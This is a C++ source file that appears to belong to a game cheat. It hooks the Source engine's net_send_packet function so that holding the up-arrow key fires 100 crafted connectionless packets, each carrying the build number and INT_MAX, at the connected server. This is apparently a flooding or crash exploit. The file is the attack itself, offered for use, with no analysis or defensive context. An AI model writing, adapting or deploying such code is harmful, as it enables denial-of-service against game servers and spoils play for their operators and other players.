#include "net_send_packet.hpp"

#include <random>

int hooks::net_send_packet::net_send_packet_detour( sdk::i_net_channel* channel, int socket, void* to, unsigned char* data, int length,
                                                    sdk::bf_write* voice_payload, bool use_compression )
{
	if ( g_input.key_state< input::KEY_DOWN >( VK_UP ) ) {
		for ( int i = 0; i < 100; i++ ) {
			char packet[ 1260 ];

			sdk::bf_write message( packet, 1260 );

			message.write_long( static_cast< int >( 0xFFFFFFFF ) );
			message.write_byte( 0 );

			message.write_long( g_interfaces.engine_client->get_engine_build_number( ) );
			message.write_long( INT_MAX );

			hooks::net_send_packet_hook.call_original( channel, 0, to, ( unsigned char* )packet, 576, voice_payload, false );
		}
	}

	return net_send_packet_hook.call_original( channel, socket, to, data, length, voice_payload, use_compression );
}
